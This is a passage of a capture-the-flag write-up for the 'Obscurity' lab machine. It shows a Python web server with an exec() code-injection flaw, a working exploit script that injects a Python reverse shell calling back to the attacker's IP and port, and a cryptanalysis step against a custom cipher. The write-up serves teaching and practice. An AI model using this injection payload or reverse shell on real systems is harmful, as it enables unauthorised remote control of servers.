            <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">listenToClient</span><span class="p">,</span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="n">address</span><span class="p">)).</span><span class="n">start</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">listenToClient</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span>
        <span class="n">size</span> <span class="o">=</span> <span class="mi">1024</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
                    <span class="c1"># Set the response to echo back the recieved data
</span>                    <span class="n">req</span> <span class="o">=</span> <span class="n">Request</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">handleRequest</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span>
                    <span class="n">client</span><span class="p">.</span><span class="n">shutdown</span><span class="p">()</span>
                    <span class="n">client</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">raise</span> <span class="n">error</span><span class="p">(</span><span class="s">'Client disconnected'</span><span class="p">)</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="n">client</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">return</span> <span class="bp">False</span>

    <span class="k">def</span> <span class="nf">handleRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">conn</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">good</span><span class="p">:</span>
<span class="c1">#            try:
</span>                <span class="c1"># print(str(request.method) + " " + str(request.doc), end=' ')
</span>                <span class="c1"># print("from {0}".format(address[0]))
#            except Exception as e:
#                print(e)
</span>            <span class="n">document</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">serveDoc</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">doc</span><span class="p">,</span> <span class="n">DOC_ROOT</span><span class="p">)</span>
            <span class="n">statusNum</span><span class="o">=</span><span class="n">document</span><span class="p">[</span><span class="s">"status"</span><span class="p">]</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">document</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">serveDoc</span><span class="p">(</span><span class="s">"/errors/400.html"</span><span class="p">,</span> <span class="n">DOC_ROOT</span><span class="p">)</span>
            <span class="n">statusNum</span><span class="o">=</span><span class="s">"400"</span>
        <span class="n">body</span> <span class="o">=</span> <span class="n">document</span><span class="p">[</span><span class="s">"body"</span><span class="p">]</span>

        <span class="n">statusCode</span><span class="o">=</span><span class="n">CODES</span><span class="p">[</span><span class="n">statusNum</span><span class="p">]</span>
        <span class="n">dateSent</span> <span class="o">=</span> <span class="s">""</span>
        <span class="n">server</span> <span class="o">=</span> <span class="s">"BadHTTPServer"</span>
        <span class="n">modified</span> <span class="o">=</span> <span class="s">""</span>
        <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
        <span class="n">contentType</span> <span class="o">=</span> <span class="n">document</span><span class="p">[</span><span class="s">"mime"</span><span class="p">]</span> <span class="c1"># Try and identify MIME type from string
</span>        <span class="n">connectionType</span> <span class="o">=</span> <span class="s">"Closed"</span>


        <span class="n">resp</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span>
        <span class="n">statusNum</span><span class="o">=</span><span class="n">statusNum</span><span class="p">,</span> <span class="n">statusCode</span><span class="o">=</span><span class="n">statusCode</span><span class="p">,</span>
        <span class="n">dateSent</span> <span class="o">=</span> <span class="n">dateSent</span><span class="p">,</span> <span class="n">server</span> <span class="o">=</span> <span class="n">server</span><span class="p">,</span>
        <span class="n">modified</span> <span class="o">=</span> <span class="n">modified</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="n">length</span><span class="p">,</span>
        <span class="n">contentType</span> <span class="o">=</span> <span class="n">contentType</span><span class="p">,</span> <span class="n">connectionType</span> <span class="o">=</span> <span class="n">connectionType</span><span class="p">,</span>
        <span class="n">body</span> <span class="o">=</span> <span class="n">body</span>
        <span class="p">)</span>

        <span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="n">stringResponse</span><span class="p">()</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">return</span> <span class="mi">0</span>

    <span class="k">def</span> <span class="nf">serveDoc</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">):</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">info</span> <span class="o">=</span> <span class="s">"output = 'Document: {}'"</span> <span class="c1"># Keep the output for later debug
</span>            <span class="k">exec</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?
</span>            <span class="n">cwd</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
            <span class="n">docRoot</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">cwd</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">"/"</span><span class="p">:</span>
                <span class="n">path</span> <span class="o">=</span> <span class="s">"/index.html"</span>
            <span class="n">requested</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
            <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">requested</span><span class="p">):</span>
                <span class="n">mime</span> <span class="o">=</span> <span class="n">mimetypes</span><span class="p">.</span><span class="n">guess_type</span><span class="p">(</span><span class="n">requested</span><span class="p">)</span>
                <span class="n">mime</span> <span class="o">=</span> <span class="p">(</span><span class="n">mime</span> <span class="k">if</span> <span class="n">mime</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="bp">None</span> <span class="k">else</span> <span class="s">"text/html"</span><span class="p">)</span>
                <span class="n">mime</span> <span class="o">=</span> <span class="n">MIMES</span><span class="p">[</span><span class="n">requested</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">requested</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
                <span class="k">except</span><span class="p">:</span>
                    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">requested</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
                <span class="n">status</span> <span class="o">=</span> <span class="s">"200"</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">errorPage</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="s">"errors"</span><span class="p">,</span> <span class="s">"404.html"</span><span class="p">)</span>
                <span class="n">mime</span> <span class="o">=</span> <span class="s">"text/html"</span>
                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">errorPage</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
                <span class="n">status</span> <span class="o">=</span> <span class="s">"404"</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
            <span class="n">errorPage</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="s">"errors"</span><span class="p">,</span> <span class="s">"500.html"</span><span class="p">)</span>
            <span class="n">mime</span> <span class="o">=</span> <span class="s">"text/html"</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">errorPage</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
            <span class="n">status</span> <span class="o">=</span> <span class="s">"500"</span>
        <span class="k">return</span> <span class="p">{</span><span class="s">"body"</span><span class="p">:</span> <span class="n">data</span><span class="p">,</span> <span class="s">"mime"</span><span class="p">:</span> <span class="n">mime</span><span class="p">,</span> <span class="s">"status"</span><span class="p">:</span> <span class="n">status</span><span class="p">}</span>
</code></pre></div></div>

<p>The script <em>handles client-server requests to the web server</em>, but contains a <strong>vulnerability</strong> in the following code segment</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">path</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
            <span class="n">info</span> <span class="o">=</span> <span class="s">"output = 'Document: {}'"</span> <span class="c1"># Keep the output for later debug
</span>            <span class="k">exec</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?
</span>            <span class="n">cwd</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
            <span class="n">docRoot</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">cwd</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">)</span>
</code></pre></div></div>

<p>since an <strong>exec</strong> instruction is executed into <em>info</em>, that contains <em>path</em>, <strong>a variable that we can populate at will</strong> and <strong>which will be injected</strong> into the exec.</p>

<p>Let‚Äôs build a script that allows us to exploit the vulnerability:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">urllib</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">target</span> <span class="o">=</span> <span class="s">'http://10.10.10.168:8080/'</span>

<span class="n">expl</span> <span class="o">=</span> <span class="s">'tmp</span><span class="se">\'</span><span class="s">'</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])</span><span class="se">\n</span><span class="s">a=</span><span class="se">\'</span><span class="s">'</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote</span><span class="p">(</span><span class="n">expl</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"payload"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">headers</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">t</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div></div>

<p>This script will inject a reverse-shell to our IP, on port 9999, as the content of the variable passed to the exec statement will compose this payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec (output = 'Document: tmp'
import socket, subprocess, os; s = socket.socket (socket.AF_INET, socket.SOCK_STREAM); s.connect (("10.10.14.27", 9999)); os.dup2 (s.fileno (), 0); os.dup2 (s.fileno (), 1); os.dup2 (s.fileno (), 2); p = subprocess.call ([ "/ bin / bash", "- i"])
a = '')
</code></pre></div></div>

<p><img src="/assets/images/Screenshots/Obscurity//2020-02-27_15-08-41.png" alt="2020-02-27_15-08-41" /></p>

<p><br /></p>
<h2 id="lateral-movement-to-robert">Lateral movement to Robert</h2>

<p>Once we got the shell as <em>www-data</em>, let‚Äôs do some post-exploitation recon to find out that the user of the machine is called <strong>Robert</strong>. Visiting his home directory we find out that we can read the contents of his files.</p>

<p><img src="/assets/images/Screenshots/Obscurity//2020-02-27_18-31-47.png" alt="2020-02-27_18-31-47" /></p>

<p>Inside the home we find a series of scripts, including a custom SSH server (<strong>BetterSSH</strong>), a crypt-decrypt tool (<strong>SuperSecureCrypt.py</strong>) and a set of files to perform some tests.</p>

<p>The code for <strong>SuperSecureCrypt.py</strong> is the following:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">argparse</span>

<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">encrypted</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
        <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
    <span class="k">return</span> <span class="n">encrypted</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">decrypted</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
        <span class="n">decrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
    <span class="k">return</span> <span class="n">decrypted</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Encrypt with 0bscura</span><span class="se">\'</span><span class="s">s encryption algorithm'</span><span class="p">)</span>

<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-i'</span><span class="p">,</span>
                    <span class="n">metavar</span><span class="o">=</span><span class="s">'InFile'</span><span class="p">,</span>
                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
                    <span class="n">help</span><span class="o">=</span><span class="s">'The file to read'</span><span class="p">,</span>
                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-o'</span><span class="p">,</span>
                    <span class="n">metavar</span><span class="o">=</span><span class="s">'OutFile'</span><span class="p">,</span>
                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
                    <span class="n">help</span><span class="o">=</span><span class="s">'Where to output the encrypted/decrypted file'</span><span class="p">,</span>
                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-k'</span><span class="p">,</span>
                    <span class="n">metavar</span><span class="o">=</span><span class="s">'Key'</span><span class="p">,</span>
                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
                    <span class="n">help</span><span class="o">=</span><span class="s">'Key to use'</span><span class="p">,</span>
                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">'store_true'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Decrypt mode'</span><span class="p">)</span>

<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="n">banner</span> <span class="o">=</span> <span class="s">"################################</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span><span class="o">+=</span> <span class="s">"#           BEGINNING          #</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span><span class="o">+=</span> <span class="s">"#    SUPER SECURE ENCRYPTOR    #</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span><span class="o">+=</span> <span class="s">"################################</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span> <span class="o">+=</span> <span class="s">"  ############################</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span> <span class="o">+=</span> <span class="s">"  #        FILE MODE         #</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span> <span class="o">+=</span> <span class="s">"  ############################"</span>
<span class="k">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">o</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">args</span><span class="p">.</span><span class="n">k</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">args</span><span class="p">.</span><span class="n">i</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Missing args"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">d</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Opening file {0}..."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">i</span><span class="p">))</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="s">"Decrypting..."</span><span class="p">)</span>
        <span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">k</span><span class="p">)</span>

        <span class="k">print</span><span class="p">(</span><span class="s">"Writing to {0}..."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">o</span><span class="p">))</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">o</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Opening file {0}..."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">i</span><span class="p">))</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="s">"Encrypting..."</span><span class="p">)</span>
        <span class="n">encrypted</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">k</span><span class="p">)</span>

        <span class="k">print</span><span class="p">(</span><span class="s">"Writing to {0}..."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">o</span><span class="p">))</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">o</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
</code></pre></div></div>

<p>while the contents of <strong>check.txt</strong>, <strong>out.txt</strong> and <strong>passwordreminder.txt</strong> is</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/CTF/HTB/Machine/Obscurity/robert# <span class="nb">cat </span>check.txt
Encrypting this file with your key should result <span class="k">in </span>out.txt, make sure your key is correct!
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/CTF/HTB/Machine/Obscurity/robert# hd out.txt
00000000  c2 a6 c3 9a c3 88 c3 aa  c3 9a c3 9e c3 98 c3 9b  |................|
00000010  c3 9d c3 9d c2 89 c3 97  c3 90 c3 8a c3 9f c2 85  |................|
00000020  c3 9e c3 8a c3 9a c3 89  c2 92 c3 a6 c3 9f c3 9d  |................|
00000030  c3 8b c2 88 c3 9a c3 9b  c3 9a c3 aa c2 81 c3 99  |................|
00000040  c3 89 c3 ab c2 8f c3 a9  c3 91 c3 92 c3 9d c3 8d  |................|
00000050  c3 90 c2 85 c3 aa c3 86  c3 a1 c3 99 c3 9e c3 a3  |................|
00000060  c2 96 c3 92 c3 91 c2 88  c3 90 c3 a1 c3 99 c2 a6  |................|
00000070  c3 95 c3 a6 c3 98 c2 9e  c2 8f c3 a3 c3 8a c3 8e  |................|
00000080  c3 8d c2 81 c3 9f c3 9a  c3 aa c3 86 c2 8e c3 9d  |................|
00000090  c3 a1 c3 a4 c3 a8 c2 89  c3 8e c3 8d c3 9a c2 8c  |................|
000000a0  c3 8e c3 ab c2 81 c3 91  c3 93 c3 a4 c3 a1 c3 9b  |................|
000000b0  c3 8c c3 97 c2 89 c2 81  76                       |........v|
000000b9
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/CTF/HTB/Machine/Obscurity/robert# hd passwordreminder.txt
00000000  c2 b4 c3 91 c3 88 c3 8c  c3 89 c3 a0 c3 99 c3 81  |................|
00000010  c3 91 c3 a9 c2 af c2 b7  c2 bf 6b                 |..........k|
0000001b
</code></pre></div></div>

<p><em>We need to find the secret key</em> in order to be able to decrypt the <strong>passwordreminder.txt</strong> file and authenticate ourselves as <strong>robert</strong>.
To do this, <em>we need to analyse the encryption script and <strong>crack out.txt</strong></em></p>

<p>Because <strong>out.txt</strong> and <strong>check.txt</strong> are ‚Äú<em>brothers</em>‚Äù (they depend on each other), what we want to do is use the <strong>SuperSecureCrypt.py</strong> encryption mechanism to <em>brute-force each character of the alphabet with each character inside check.txt</em>, until get out.txt.</p>

<p>To do this, we just need to build a quick python script</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">string</span>

<span class="n">banner</span> <span class="o">=</span> <span class="s">"################################</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span><span class="o">+=</span> <span class="s">"#           BEGINNING          #</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span><span class="o">+=</span> <span class="s">"#    SUPER SECURE ENCRYPTOR    #</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span><span class="o">+=</span> <span class="s">"################################</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span><span class="o">+=</span> <span class="s">"################################</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span><span class="o">+=</span> <span class="s">"#        BRUTE FORCE MODE      #</span><span class="se">\n</span><span class="s">"</span>
<span class="n">banner</span><span class="o">+=</span> <span class="s">"################################"</span>
<span class="k">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>

<span class="n">key</span> <span class="o">=</span> <span class="s">""</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'check.txt'</span><span class="p">,</span><span class="s">'r'</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">clearFile</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'out.txt'</span><span class="p">,</span><span class="s">'r'</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">cryptedFile</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">indCrypt</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">cryptChr</span> <span class="ow">in</span> <span class="n">cryptedFile</span><span class="p">:</span>    <span class="c1"># ciclo ogni carattere criptato
</span>
